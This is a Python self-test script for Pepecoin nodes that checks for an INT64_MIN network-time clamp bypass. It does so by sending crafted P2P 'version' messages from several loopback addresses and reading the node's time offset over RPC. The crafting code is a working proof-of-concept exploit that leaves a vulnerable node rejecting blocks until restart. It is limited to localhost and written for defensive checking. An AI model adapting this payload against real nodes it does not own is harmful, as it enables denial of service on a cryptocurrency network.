#!/usr/bin/env python3
# Copyright (c) 2024 The Pepecoin Core developers
# Distributed under the MIT software license.
#
# =============================================================================
#  PEP-001 SELF-TEST  --  run this ON THE HOST OF A NODE YOU OWN, over loopback
# =============================================================================
# Tells you whether YOUR OWN Pepecoin node is vulnerable to the abs64(INT64_MIN)
# network-time clamp bypass, by:
#   1. reading your node's current getnetworkinfo.timeoffset (via RPC),
#   2. sending 8 `version` messages (nTime = INT64_MIN + node_second) from
#      distinct loopback source IPs 127.0.0.2..127.0.0.9,
#   3. reading timeoffset again and printing a VULNERABLE / NOT-VULNERABLE verdict.
#
# SAFETY / SCOPE (enforced in code):
#   * The P2P target is HARDCODED to 127.0.0.1 -- this tool cannot be pointed at
#     a remote host. Run it locally on the machine your node runs on.
#   * It only works over loopback anyway: AddTimeData de-duplicates time samples
#     by source IP, and only 127.0.0.0/8 gives you distinct source IPs from one
#     machine. Firing at a remote node from a single host contributes ONE sample
#     and does nothing.
#   * On a vulnerable node this drives timeoffset to INT64_MIN, which makes the
#     node reject all blocks until RESTART. Only do this on a node you can
#     restart (a test node, or during a maintenance window). It does NOT corrupt
#     the datadir; a restart clears the poisoned offset.
#
# Usage:
#   python3 pepecoin_timewarp_selftest.py --p2p-port 33874 \
#       --rpc-port 33875 --rpc-user U --rpc-password P
#   # or use the datadir cookie instead of user/password:
#   python3 pepecoin_timewarp_selftest.py --p2p-port 33874 \
#       --rpc-port 33875 --datadir ~/.pepecoin
# =============================================================================

import argparse
import base64
import hashlib
import json
import os
import socket
import struct
import sys
import time
import urllib.request

HOST = "127.0.0.1"          # hardcoded on purpose; do not make this configurable
INT64_MIN = -(2 ** 63)

# Network magic per chain (chainparams.cpp pchMessageStart).
MAGIC = {
    "main":    b"\xc0\xa0\xf0\xe0",
    "test":    b"\xfe\xc1\xdb\xcc",
    "regtest": b"\xfa\xbf\xb5\xda",
}


# ---- minimal JSON-RPC to the local node (read-only calls only) --------------
class RPC:
    def __init__(self, port, user, password, datadir):
        self.url = "http://%s:%d/" % (HOST, port)
        if user is None and datadir:
            cookie = os.path.join(os.path.expanduser(datadir), ".cookie")
            # try common regtest/testnet subdirs too
            for c in (cookie,
                      os.path.join(os.path.expanduser(datadir), "regtest", ".cookie"),
                      os.path.join(os.path.expanduser(datadir), "testnet3", ".cookie")):
                if os.path.exists(c):
                    user, password = open(c).read().split(":", 1)
                    break
        self.auth = base64.b64encode(("%s:%s" % (user, password)).encode()).decode()

    def call(self, method, *params):
        body = json.dumps({"jsonrpc": "1.0", "id": "selftest",
                           "method": method, "params": list(params)}).encode()
        req = urllib.request.Request(self.url, data=body,
                                     headers={"Authorization": "Basic " + self.auth,
                                              "Content-Type": "text/plain"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())["result"]


# ---- raw P2P `version` sender (loopback only) -------------------------------
def dsha(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()

def wire(magic, cmd, payload):
    return magic + cmd.encode().ljust(12, b"\0") + struct.pack("<I", len(payload)) + dsha(payload)[:4] + payload

def netaddr(ip, port):
    return struct.pack("<Q", 1) + b"\x00" * 10 + b"\xff\xff" + socket.inet_aton(ip) + struct.pack(">H", port)

def version_payload(evil_time, dstport):
    p  = struct.pack("<i", 70015) + struct.pack("<Q", 1) + struct.pack("<q", evil_time)
    p += netaddr(HOST, dstport) + netaddr("0.0.0.0", 0) + struct.pack("<Q", 0x1337)
    ua = b"/pep-selftest/"
    p += struct.pack("<B", len(ua)) + ua + struct.pack("<i", 0) + struct.pack("<B", 0)
    return p

def send_hostile(magic, src_ip, dstport, evil_time):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((src_ip, 0))          # distinct loopback source IP -> distinct CNetAddr
    except OSError as e:
        raise SystemExit("cannot bind source %s (%s). Run on the node's own host; "
                         "127.0.0.0/8 must be usable as a source." % (src_ip, e))
    s.settimeout(5)
    s.connect((HOST, dstport))
    s.sendall(wire(magic, "version", version_payload(evil_time, dstport)))
    try:
        s.recv(4096)
        s.sendall(wire(magic, "verack", b""))
        s.recv(4096)
    except socket.timeout:
        pass
    return s


def main():
    ap = argparse.ArgumentParser(description="PEP-001 self-test for a node YOU own (loopback only).")
    ap.add_argument("--p2p-port", type=int, required=True, help="your node's P2P listen port")
    ap.add_argument("--rpc-port", type=int, required=True, help="your node's RPC port")
    ap.add_argument("--rpc-user", default=None)
    ap.add_argument("--rpc-password", default=None)
    ap.add_argument("--datadir", default=None, help="use the .cookie in this datadir instead of user/pass")
    ap.add_argument("--chain", choices=list(MAGIC), default="main")
    ap.add_argument("--peers", type=int, default=8, help="distinct loopback source IPs to use (>=5)")
    ap.add_argument("--i-own-this-node", action="store_true",
                    help="required acknowledgement that you own/operate the target node")
    args = ap.parse_args()

    if not args.i_own_this_node:
        raise SystemExit("Refusing to run without --i-own-this-node. This poisons the node's clock "
                         "until restart; only run it against a node you own and can restart.")

    magic = MAGIC[args.chain]
    rpc = RPC(args.rpc_port, args.rpc_user, args.rpc_password, args.datadir)

    # 1) read the node's current offset and confirm it's really ours (RPC works).
    try:
        info = rpc.call("getnetworkinfo")
    except Exception as e:
        raise SystemExit("RPC to 127.0.0.1:%d failed (%s). This test needs local RPC access to your "
                         "own node so it can read the verdict." % (args.rpc_port, e))
    before = info["timeoffset"]
    maxadj = 70 * 60
    print("node subversion : %s" % info.get("subversion"))
    print("timeoffset before: %d s" % before)

    # 2) fire the hostile version messages from distinct loopback IPs.
    time.sleep((1.0 - time.time() % 1.0) + 0.05)     # align to a whole second
    evil = INT64_MIN + int(time.time())              # -> offset sample == INT64_MIN
    conns = []
    for i in range(max(5, args.peers)):
        conns.append(send_hostile(magic, "127.0.0.%d" % (2 + i), args.p2p_port, evil))
    print("sent %d hostile `version` messages (offset==INT64_MIN) from 127.0.0.2.." % len(conns))
    time.sleep(3)
    for s in conns:
        try: s.close()
        except OSError: pass

    # 3) read the offset again and decide.
    after = rpc.call("getnetworkinfo")["timeoffset"]
    print("timeoffset after : %d s" % after)
    print("-" * 60)
    if abs(after) > maxadj:
        print("RESULT: VULNERABLE  (offset escaped the +/-%ds clamp -> %d)" % (maxadj, after))
        print("Your node is running the pre-fix abs64() timedata code (PEP-001).")
        print("A poisoned node rejects all blocks until restarted. Fix: apply the")
        print("upstream signed-bounds clamp (Bitcoin d1292f25f / Dogecoin 1.14.8),")
        print("then RESTART this node to clear the poisoned offset.")
        rc = 1
    else:
        print("RESULT: NOT VULNERABLE  (offset stayed within +/-%ds -> %d)" % (maxadj, after))
        print("Your node clamps the offset correctly (fixed timedata code).")
        rc = 0
    # try to leave the node in a clean state note
    print("(If VULNERABLE: restart the node to clear the poisoned time offset.)")
    sys.exit(rc)


if __name__ == "__main__":
    main()
